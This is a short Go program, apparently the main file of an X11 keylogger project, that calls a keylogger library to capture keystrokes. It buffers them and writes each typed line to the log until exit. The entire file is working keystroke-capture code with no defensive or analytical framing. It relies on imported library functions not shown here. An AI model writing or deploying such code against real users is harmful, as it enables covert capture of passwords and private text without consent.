package main

import (
	"log"

	"github.com/ljesparis/x11goklogger/pkg/kl"
	"github.com/ljesparis/x11goklogger/pkg/utils"
)

func panicIfError(err error) {
	if err != nil {
		log.Panicln(err)
	}
}

func main() {
	err := kl.InitKeylogger()
	panicIfError(err)

	utils.Atexit(func() {
		err := kl.DestroyKeylogger()
		panicIfError(err)
	})

	var bff string
	kl.StartReadingInput(func(n string) {
		if n == "\n" {
			if len(bff) > 0 {
				log.Println(bff)
			}

			bff = ""
		} else {
			bff += n
		}
	})
}
